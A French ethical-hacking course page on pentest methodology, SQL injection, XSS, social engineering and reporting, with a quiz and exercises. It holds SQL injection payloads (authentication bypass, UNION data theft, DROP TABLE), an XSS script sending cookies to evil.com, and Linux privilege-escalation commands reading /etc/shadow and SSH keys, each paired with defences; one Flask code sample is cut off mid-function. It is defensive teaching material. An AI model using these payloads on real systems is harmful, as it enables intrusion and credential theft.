Introduction

Penser comme un attaquant

Le hacking éthique (ou test d'intrusion) consiste à simuler des cyberattaques contre un système avec l'autorisation explicite de son propriétaire, afin d'identifier les vulnérabilités avant qu'un attaquant malveillant ne les exploite. Le pentester (testeur d'intrusion) utilise les mêmes techniques que les hackers, mais dans un cadre légal, contractuel et éthique.

La philosophie est simple : pour construire une défense solide, il faut comprendre l'offensive. Les entreprises font appel à des pentesters pour évaluer la robustesse de leurs systèmes, identifier les failles critiques et prioriser les corrections. Ce domaine est encadré par des normes (PTES, OSSTMM) et des certifications reconnues (CEH, OSCP, GPEN).

Cadre légal : toute tentative d'intrusion sans autorisation écrite est un délit pénal en France (articles 323-1 à 323-8 du Code pénal). Le hacking éthique nécessite un contrat de mission (scope, périmètre, autorisations) avant tout test. Les programmes de bug bounty offrent un cadre légal pour les chercheurs indépendants.

Ce cours présente la méthodologie du pentest, les principales vulnérabilités web (OWASP Top 10), les techniques d'attaque classiques comme l'injection SQL et le XSS, ainsi que l'ingénierie sociale qui exploite le maillon humain.

Méthodologie et techniques offensives

Méthodologie du test d'intrusion

Un pentest professionnel suit une méthodologie structurée en cinq phases :

1. Reconnaissance : collecter un maximum d'informations sur la cible sans interagir directement avec elle (passive) ou en interagissant (active). OSINT (Open Source Intelligence), recherche DNS, analyse des réseaux sociaux, Google dorking.

2. Scanning : identifier les systèmes actifs, les ports ouverts, les services et leurs versions. Nmap pour le scan de ports, Nessus ou OpenVAS pour le scan de vulnérabilités, Nikto pour les serveurs web.

3. Exploitation : tenter d'exploiter les vulnérabilités découvertes pour obtenir un accès. Metasploit est le framework d'exploitation le plus utilisé. L'objectif est de prouver la faisabilité de l'attaque.

4. Post-exploitation : une fois un accès obtenu, évaluer l'étendue de la compromission. Escalade de privilèges, mouvement latéral, exfiltration de données de test, persistance.

5. Rapport : documenter toutes les découvertes avec les preuves, évaluer la criticité de chaque vulnérabilité (CVSS) et proposer des recommandations concrètes de correction, priorisées par risque.

Reconnaissance — Commandes essentielles
# Reconnaissance DNS
whois example.com                    # Infos d'enregistrement
dig example.com ANY                  # Tous les enregistrements DNS
dig example.com AXFR @ns1.example.com # Transfert de zone (si autorisé)

# Énumération de sous-domaines
subfinder -d example.com             # Découverte passive
gobuster dns -d example.com -w wordlist.txt # Brute force

# Scan de ports avec Nmap
nmap -sS -sV -O -A example.com       # Scan SYN + versions + OS
nmap -sV --script vuln example.com   # Scripts de détection de vulns

# Scan de vulnérabilités web
nikto -h https://example.com         # Vulnérabilités serveur web
wpscan --url https://example.com     # Spécifique WordPress

Injection SQL

L'injection SQL est l'une des vulnérabilités les plus dangereuses et les plus anciennes. Elle permet à un attaquant d'exécuter des requêtes SQL arbitraires sur la base de données en injectant du code malveillant dans les entrées utilisateur non validées.

Injection SQL — Exemple
# Code PHP vulnérable (NE JAMAIS FAIRE CECI)
$user = $_POST['username'];
$pass = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

# Si l'attaquant saisit comme username :
' OR '1'='1' --

# La requête devient :
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='...'
# → Toujours vrai ! L'attaquant est authentifié sans mot de passe

# Variantes plus dangereuses :
' UNION SELECT username, password FROM users --     # Vol de données
' ; DROP TABLE users --                              # Destruction
' ; INSERT INTO admins VALUES('hacker','pass') --   # Élévation

# SOLUTION : Requêtes paramétrées (prepared statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$user, $pass]);
# → Les entrées sont traitées comme des données, JAMAIS comme du code

Cross-Site Scripting (XSS)

Le XSS permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Le script s'exécute dans le navigateur de la victime, avec ses privilèges (cookies, session).

XSS réfléchi (Reflected) : le script malveillant est inclus dans l'URL et exécuté quand la victime clique sur le lien piégé. Le serveur renvoie le script dans la réponse sans le filtrer.

XSS stocké (Stored) : le script est enregistré dans la base de données (ex: commentaire de forum) et exécuté à chaque affichage de la page. Plus dangereux car touche tous les visiteurs.

XSS basé sur le DOM : le script est injecté côté client via la manipulation du DOM, sans passer par le serveur. Plus difficile à détecter.

XSS — Attaque et défense
# XSS stocké — Exemple dans un champ de commentaire

# L'attaquant poste comme commentaire :
<script>
  // Vol de cookie de session
  new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

# Chaque visiteur qui affiche le commentaire exécute ce script
# → Leur cookie de session est envoyé à l'attaquant

# DÉFENSES :

# 1. Échappement des sorties (output encoding)
# PHP :
htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
# Transforme < en &lt; et > en &gt;

# 2. Content Security Policy (en-tête HTTP)
Content-Security-Policy: default-src 'self'; script-src 'self'
# → Bloque l'exécution de scripts inline et externes non autorisés

# 3. Cookies HttpOnly
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
# → JavaScript ne peut pas lire le cookie (document.cookie vide)

Ingénierie sociale

L'ingénierie sociale exploite la psychologie humaine plutôt que les failles techniques. C'est souvent le vecteur d'attaque le plus efficace car il contourne toutes les protections techniques en manipulant directement les utilisateurs.

Phishing : emails frauduleux imitant une entité de confiance (banque, employeur, service en ligne) pour inciter la victime à révéler ses identifiants ou installer un malware. Le spear phishing cible un individu spécifique avec des informations personnalisées.

Pretexting : l'attaquant invente un scénario crédible pour obtenir des informations. Par exemple, se faire passer pour le support technique et demander un mot de passe « pour résoudre un problème urgent ».

Baiting : laisser une clé USB infectée dans un lieu public (parking de l'entreprise, salle de réunion). La curiosité humaine pousse souvent à la brancher sur un ordinateur.

Tailgating : suivre un employé autorisé à travers une porte sécurisée sans badge, en comptant sur la politesse (« Pouvez-vous me tenir la porte ? »).

Contre-mesures : formation régulière et sensibilisation des employés, exercices de phishing simulé, procédures de vérification d'identité, politique de bureau propre (clean desk), destruction des documents sensibles, signalement des comportements suspects. La technologie seule ne suffit pas face à l'ingénierie sociale.

Rapport de pentest et remédiation

Le rapport est le livrable final d'un pentest. Il doit être compréhensible aussi bien par les dirigeants (résumé exécutif) que par les équipes techniques (détails des vulnérabilités).

Chaque vulnérabilité est décrite avec : sa localisation exacte, les étapes de reproduction, les preuves (captures d'écran, logs), le score CVSS, l'impact potentiel et les recommandations de correction priorisées. Le rapport inclut aussi les tests négatifs (ce qui a résisté) pour donner une vue complète de la posture de sécurité.

La remédiation est un processus itératif : après correction des vulnérabilités, un re-test vérifie que les corrections sont effectives et n'ont pas introduit de nouvelles failles. Le cycle pentest-correction-retest est idéalement répété au moins annuellement.

Question 1 / 6

Quelle est la première phase d'un test d'intrusion ?

La reconnaissance est la première phase : elle consiste à collecter un maximum d'informations sur la cible (OSINT, DNS, réseaux sociaux) avant toute interaction technique directe.

Question 2 / 6

Quelle est la meilleure défense contre l'injection SQL ?

Les requêtes paramétrées séparent le code SQL des données utilisateur. Les entrées sont toujours traitées comme des valeurs, jamais comme du code exécutable, ce qui rend l'injection impossible.

Question 3 / 6

Quel type de XSS est le plus dangereux car il touche tous les visiteurs d'une page ?

Le XSS stocké est le plus dangereux car le script malveillant est enregistré en base de données et exécuté automatiquement dans le navigateur de chaque visiteur, sans nécessiter de clic sur un lien piégé.

Question 4 / 6

Qu'est-ce que le « spear phishing » ?

Le spear phishing est une attaque ciblée : l'attaquant recherche des informations sur sa victime (poste, collègues, projets) pour créer un message crédible et personnalisé, rendant la détection beaucoup plus difficile.

Question 5 / 6

Quel en-tête HTTP aide à prévenir les attaques XSS ?

Content-Security-Policy (CSP) permet de définir quelles sources de scripts sont autorisées. En bloquant les scripts inline et les sources non approuvées, CSP empêche l'exécution de code injecté par XSS.

Question 6 / 6

Dans le cadre légal français, que faut-il obligatoirement avant de réaliser un pentest ?

En France, toute tentative d'intrusion sans autorisation est un délit pénal (art. 323-1 du Code pénal). Un contrat de mission détaillant le périmètre, les méthodes autorisées et les limites est indispensable avant tout test.

Exercice 1 — Détection d'injection SQL

Analysez le code Python suivant et identifiez toutes les vulnérabilités d'injection SQL. Réécrivez le code de manière sécurisée en utilisant des requêtes paramétrées.

Voir la solution 
# CODE VULNÉRABLE
def rechercher_utilisateur(nom):
    query = f"SELECT * FROM users WHERE name = '{nom}'"
    cursor.execute(query)
    return cursor.fetchall()

def modifier_email(user_id, email):
    query = "UPDATE users SET email = '%s' WHERE id = %s" % (email, user_id)
    cursor.execute(query)

# PROBLÈMES :
# 1. f-string avec interpolation directe → injection SQL
# 2. % formatting avec interpolation directe → injection SQL
# Un attaquant peut saisir : '; DROP TABLE users; --

# CODE CORRIGÉ
def rechercher_utilisateur(nom):
    query = "SELECT * FROM users WHERE name = %s"
    cursor.execute(query, (nom,))  # Paramètre séparé
    return cursor.fetchall()

def modifier_email(user_id, email):
    query = "UPDATE users SET email = %s WHERE id = %s"
    cursor.execute(query, (email, user_id))  # Paramètres séparés

# RÈGLES :
# - JAMAIS de concaténation ou f-string dans les requêtes SQL
# - Toujours utiliser les placeholders (%s, ?, :param)
# - Le pilote de base de données gère l'échappement
# - Valider aussi le type des entrées (email valide, id entier)

from flask import Flask, request, render_template_string
from markupsafe import escape
import bleach

app = Flask(__name__)

# En-têtes de sécurité
@app.after_request
def ajouter_entetes(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; script-src 'self'; style-src 'self'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

# Sanitisation des commentaires
def nettoyer_commentaire(texte):
    # Autoriser uniquement certaines balises HTML sûres
    tags_autorises = ['b', 'i', 'em', 'strong', 'p', 'br']

Exercice 3 — Analyse d'un email de phishing

Vous recevez un email prétendant venir de votre banque demandant de « vérifier votre compte » via un lien. Listez les 10 éléments que vous devriez vérifier pour déterminer s'il s'agit de phishing, et expliquez pourquoi chacun est révélateur.

Voir la solution 
10 ÉLÉMENTS À VÉRIFIER DANS UN EMAIL SUSPECT

1. Adresse de l'expéditeur
   → Vérifier le domaine réel (support@banque-securite.xyz
     au lieu de @mabanque.fr). Attention au typosquatting.

2. URL du lien (survol sans cliquer)
   → L'URL pointe-t-elle vers le vrai domaine de la banque ?
     https://mabanque.fr.evil.com/ ≠ https://mabanque.fr/

3. Urgence artificielle
   → "Votre compte sera bloqué dans 24h" → pression pour
     agir vite sans réfléchir (technique de manipulation).

4. Fautes d'orthographe et de grammaire
   → Les emails officiels sont relus. Les fautes inhabituelles
     sont un indicateur (mais les phishings modernes sont soignés).

5. Salutation générique
   → "Cher client" au lieu de votre nom complet.
     Les vrais emails utilisent vos données personnelles.

6. En-têtes techniques de l'email (source)
   → Vérifier SPF, DKIM, DMARC dans les en-têtes.
     Received: le serveur d'envoi correspond-il à la banque ?

7. Pièces jointes suspectes
   → .exe, .zip, .docm (macros) → malware potentiel.
     Une banque ne demande jamais de télécharger un exécutable.

8. Demande d'informations sensibles
   → Aucune banque ne demande mot de passe, code PIN ou
     numéro de carte par email. Jamais.

9. Certificat HTTPS du site lié
   → Le cadenas ne garantit pas la légitimité !
     Les phishers utilisent Let's Encrypt. Vérifier le CN.

10. Cohérence avec vos activités
    → Avez-vous vraiment un compte dans cette banque ?
      Avez-vous effectué l'action mentionnée dans l'email ?

Exercice 4 — Escalade de privilèges

Sur un serveur Linux, vous avez obtenu un accès en tant qu'utilisateur standard lors d'un pentest autorisé. Listez au moins 8 vérifications à effectuer pour identifier des opportunités d'escalade de privilèges vers root, avec les commandes correspondantes.

Voir la solution 
# ESCALADE DE PRIVILÈGES LINUX — VÉRIFICATIONS

# 1. Droits sudo de l'utilisateur courant
sudo -l
# → Chercher des commandes exécutables sans mot de passe
#   (NOPASSWD), ou des binaires exploitables (vim, find, python)

# 2. Fichiers SUID (exécutés avec les droits du propriétaire)
find / -perm -4000 -type f 2>/dev/null
# → Un binaire SUID root = exécution en tant que root
#   Chercher des binaires inhabituels ou vulnérables

# 3. Tâches cron exécutées en root
cat /etc/crontab
ls -la /etc/cron.d/
# → Scripts cron écrits en world-writable = modification possible

# 4. Fichiers sensibles lisibles
cat /etc/shadow        # Hashes des mots de passe
cat /etc/passwd        # Utilisateurs (shell, home)
find / -name "*.conf" -readable 2>/dev/null  # Configs avec MDP

# 5. Variables d'environnement et historique
env
cat ~/.bash_history    # Commandes passées (mots de passe ?)
cat ~/.ssh/id_rsa      # Clés SSH privées

# 6. Version du noyau (exploits kernel)
uname -a
# → Chercher des exploits connus (Dirty COW, etc.)

# 7. Services internes en écoute
netstat -tlnp
ss -tlnp
# → Services root en écoute sur localhost uniquement

# 8. Capabilities Linux
getcap -r / 2>/dev/null
# → python3 = cap_setuid → élévation de privilèges

# Outils automatisés : LinPEAS, LinEnum, linux-exploit-suggester
